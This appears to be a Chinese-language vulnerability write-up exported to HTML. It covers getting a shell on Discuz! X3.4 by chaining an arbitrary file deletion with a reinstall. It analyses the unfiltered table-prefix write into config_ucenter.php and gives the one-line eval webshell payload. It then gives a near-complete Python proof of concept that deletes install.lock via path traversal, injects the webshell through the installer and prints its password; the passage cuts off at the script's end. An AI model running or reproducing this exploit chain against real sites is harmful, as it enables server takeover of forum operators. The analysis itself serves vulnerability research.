<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="discuz-x34-任意文件删除配合install过程getshell"><span class="csDE05BCC">Discuz! X3.4 </span><span class="csECDA2D3">任意文件删除配合</span><span class="csDE05BCC">install</span><span class="csECDA2D3">过程</span><span class="csDE05BCC">getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">**</span><span class="cs9C1B1871">可以利用的条件：</span><span class="cs8926E06">**1</span><span class="cs9C1B1871">、安装后没有登录后台，此时</span><span class="cs8926E06">install/index</span><span class="cs9C1B1871">还没删除</span><span class="cs8926E06"> 2</span><span class="cs9C1B1871">、因为其他原因没有删除</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Discuz! X3.4</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个方法是看到一篇博客分析的，主要是利用文件删除漏洞删掉</span><span class="cs9FB05234">install.lock</span><span class="cs9C1B1871">文件，绕过对安装完成的判断能够再进行安装的过程，然后再填写配置信息处构使用构造的表前缀名，时一句话写入配置文件中，</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">表前缀：</span><span class="cs9FB05234">x&#39;);@eval($_POST[lanvnal]);(&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是我在使用上面版本</span><span class="cs8926E06">v3.4</span><span class="cs9C1B1871">的代码时发现，安装后</span><span class="cs9FB05234">install</span><span class="cs9C1B1871">目录下不存在</span><span class="cs9FB05234">index.php</span><span class="cs9C1B1871">了。分析代码发现会有安装后的删除处理，在</span><span class="cs9FB05234">/source/admincp/admincp_index.php</span><span class="cs9C1B1871">的第</span><span class="cs8926E06">14</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;) &amp;&amp; !DISCUZ_DEBUG) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@unlink(DISCUZ_ROOT.&#39;./install/index.php&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dexit(&#39;Please delete install/index.php via FTP!&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那是不是老版本存在该问题呢？</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我翻了历史版本代码，直到</span><span class="cs8926E06">git</span><span class="cs9C1B1871">提交的第一个版本都有如上的处理。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但还是分析一下吧，就当学习了。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">**</span><span class="cs9C1B1871">可以利用的条件：</span><span class="cs8926E06">**1</span><span class="cs9C1B1871">、安装后没有登录后台，此时</span><span class="cs8926E06">install/index</span><span class="cs9C1B1871">还没删除</span><span class="cs8926E06"> 2</span><span class="cs9C1B1871">、因为其他原因没有删除</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">分析一下安装逻辑，</span><span class="cs9FB05234">install/index.php</span><span class="cs9C1B1871">文件的整体流程如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4%e9%85%8d%e5%90%88install%e8%bf%87%e7%a8%8bgetshell_files/image0.png" width="560" height="203" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">分别是我们安装的每一步，接受协议</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">环境检测</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">是否安装</span><span class="cs8926E06"> UCenter Server-&gt;</span><span class="cs9C1B1871">数据库配置信息</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">安装过程，生成</span><span class="cs8926E06">lock</span><span class="cs9C1B1871">文件</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">检查</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">问题出在在</span><span class="cs8926E06"> </span><span class="cs9FB05234">db_init</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的处理中，在代码第</span><span class="cs8926E06">369</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if(DZUCFULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;install_uc_server();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs9FB05234">install_uc_server</span><span class="cs9C1B1871">，在</span><span class="cs8926E06">1296</span><span class="cs9C1B1871">行可以发现对</span><span class="cs8926E06">config</span><span class="cs9C1B1871">参数没做任何过滤传入到</span><span class="cs9FB05234">save_uc_config</span><span class="cs9C1B1871">中：</span></p><p class="cs3A447A38"><span class="cs9FB05234">save_uc_config($config, ROOT_PATH.&#39;./config/config_ucenter.php&#39;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后</span><span class="cs9FB05234">save_uc_config</span><span class="cs9C1B1871">也没做任何安全处理，就拼接参数后写入文件：</span></p><p class="cs3A447A38"><span class="cs9FB05234">function save_uc_config($config, $file) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$success = false;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;list($appauthkey, $appid, $ucdbhost, $ucdbname, $ucdbuser, $ucdbpw, $ucdbcharset, $uctablepre, $uccharset, $ucapi, $ucip) = $config;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$link = function_exists(&#39;mysql_connect&#39;) ? mysql_connect($ucdbhost, $ucdbuser, $ucdbpw, 1) : new mysqli($ucdbhost, $ucdbuser, $ucdbpw, $ucdbname);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$uc_connnect = $link ? &#39;mysql&#39; : &#39;&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$year = date(&#39;Y&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$config = &lt;&lt;&lt;EOT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">define(&#39;UC_CONNECT&#39;, &#39;$uc_connnect&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">define(&#39;UC_DBHOST&#39;, &#39;$ucdbhost&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_DBUSER&#39;, &#39;$ucdbuser&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_DBPW&#39;, &#39;$ucdbpw&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_DBNAME&#39;, &#39;$ucdbname&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_DBCHARSET&#39;, &#39;$ucdbcharset&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_DBTABLEPRE&#39;, &#39;`$ucdbname`.$uctablepre&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_DBCONNECT&#39;, 0);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">define(&#39;UC_CHARSET&#39;, &#39;$uccharset&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_KEY&#39;, &#39;$appauthkey&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_API&#39;, &#39;$ucapi&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_APPID&#39;, &#39;$appid&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_IP&#39;, &#39;$ucip&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">define(&#39;UC_PPP&#39;, 20);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">EOT;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($fp = fopen($file, &#39;w&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite($fp, $config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose($fp);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$success = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $success;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为</span><span class="cs8926E06"> </span><span class="cs9FB05234">dbhost, dbuser</span><span class="cs9C1B1871">等参数需要用来连接数据库，所以利用</span><span class="cs8926E06"> </span><span class="cs9FB05234">tablepre</span><span class="cs8926E06"> </span><span class="cs9C1B1871">向配置文件写入</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">如果安装后</span><span class="cs9FB05234">install/index.php</span><span class="cs9C1B1871">因为某些原因还存在，直接访问会有如下警告：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4%e9%85%8d%e5%90%88install%e8%bf%87%e7%a8%8bgetshell_files/image1.png" width="560" height="279" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过文件删除漏洞删除</span><span class="cs8926E06">data</span><span class="cs9C1B1871">目录下的</span><span class="cs9FB05234">install.lock</span><span class="cs9C1B1871">文件就可以重新安装。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">安装过程修改表前缀内容为：</span><span class="cs9FB05234">x&#39;);@eval($_POST[lanvnal]);(&#39;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4%e9%85%8d%e5%90%88install%e8%bf%87%e7%a8%8bgetshell_files/image2.png" width="560" height="306" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">config/config_ucenter.php</span><span class="cs9C1B1871">中已经写入了</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4%e9%85%8d%e5%90%88install%e8%bf%87%e7%a8%8bgetshell_files/image3.png" width="560" height="316" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Discuz/Discuz!%20X3.4%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4%e9%85%8d%e5%90%88install%e8%bf%87%e7%a8%8bgetshell_files/image4.png" width="560" height="288" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import base64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import random</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import string</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">sess = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">randstr = lambda len=5: &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(len))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">##################################################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">########## Customize these parameters ############</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">target = &#39;http://localhost/discuzx&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># login target site first, and copy the cookie here</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cookie = &quot;UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell_password = randstr()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">db_host = &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">db_user = &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">db_pw = &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">db_name = &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#################################################</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">path = &#39;/home.php?mod=spacecp&amp;ac=profile&amp;op=base&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url = target + path</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">sess.headers.update({</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Referer&#39;: url})</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"># sess.proxies.update({&#39;http&#39;: &#39;socks5://localhost:1080&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># sess.proxies.update({&#39;http&#39;: &#39;http://localhost:8080&#39;})</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def login(username=None, password=None):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sess.headers.update({&#39;Cookie&#39;: cookie})</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def get_form_hash():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = sess.get(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;match = re.search(r&#39;&quot;member.php\?mod=logging&amp;amp;action=logout&amp;amp;formhash=(.*?)&quot;&#39;, r.text, re.I)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if match:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return match.group(1)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def tamper(formhash, file_to_delete):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;formhash&#39;: (None, formhash),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;profilesubmit&#39;: (None, &#39;true&#39;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;birthprovince&#39;: (None, file_to_delete)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = sess.post(url, files=data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;parent.show_success&#39; in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;tamperred successfully&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def delete(formhash, file):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not tamper(formhash, file):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;image = b&#39;iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;formhash&#39;: formhash,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;profilesubmit&#39;: &#39;true&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;files = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;birthprovince&#39;: (&#39;image.png&#39;, base64.b64decode(image), &#39;image/png&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = sess.post(url, data=data, files=files)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;parent.show_success&#39; in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;delete {} successfully&#39;.format(file))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def getshell():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;install_url = target + &#39;/install/index.php&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = sess.get(install_url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;</span><span class="cs7FFD2630">安装向导</span><span class="cs9FB05234">&#39; not in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;install directory not exists&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;table_prefix = &quot;x&#39;);@eval($_POST[{}]);(&#39;&quot;.format(shell_password)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;step&#39;: 3,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;install_ucenter&#39;: &#39;yes&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;dbinfo[dbhost]&#39;: db_host,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;dbinfo[dbname]&#39;: db_name,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;dbinfo[dbuser]&#39;: db_user,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;dbinfo[dbpw]&#39;: db_pw,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;dbinfo[tablepre]&#39;: table_prefix,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;dbinfo[adminemail]&#39;: &#39;admin@admin.com&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;admininfo[username]&#39;: &#39;admin&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;admininfo[password]&#39;: &#39;admin&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;admininfo[password2]&#39;: &#39;admin&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;admininfo[email]&#39;: &#39;admin@admin.com&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = sess.post(install_url, data=data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;</span><span class="cs7FFD2630">建立数据表</span><span class="cs9FB05234"> CREATE TABLE&#39; not in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;write shell failed&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;shell: {}/config/config_ucenter.php&#39;.format(target))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;password: {}&#39;.format(shell_password))</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;form_hash = get_form_hash()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if form_hash:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delete(form_hash, &#39;../../../data/install.lock&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getshell()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 